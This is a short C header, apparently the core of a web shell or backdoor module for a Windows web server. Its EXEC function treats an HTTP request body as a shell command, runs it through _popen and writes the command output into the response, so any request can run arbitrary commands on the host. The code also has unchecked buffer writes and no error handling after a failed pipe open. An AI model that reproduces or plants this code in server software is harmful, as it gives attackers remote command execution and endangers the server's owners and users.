#pragma once
//Input RequestBody £¬ Request Content-Length AND Pointer of ResponseBody
int EXEC(PUCHAR pEntityBuffer, int Length, char* RESULT)
{
    pEntityBuffer[Length] = '\x00';
    for (int i = 0; i < 30000; i++)
        RESULT[i] = '\x00';
    char Buf[409600];
    //Define buffer                        
    FILE* PIPE = _popen((char*)pEntityBuffer, "r");
    //Open the pipe and execute the command 
    if (!PIPE)
    {
        printf("wrong!");
    };
    while (!feof(PIPE))
    {
        if (fgets(Buf, 4096, PIPE)) {
            //Output pipeline to result  
            strcat(RESULT, Buf);
        }
    }
    //CLOSE PIPE
	_pclose(PIPE);                            
    return 1;
}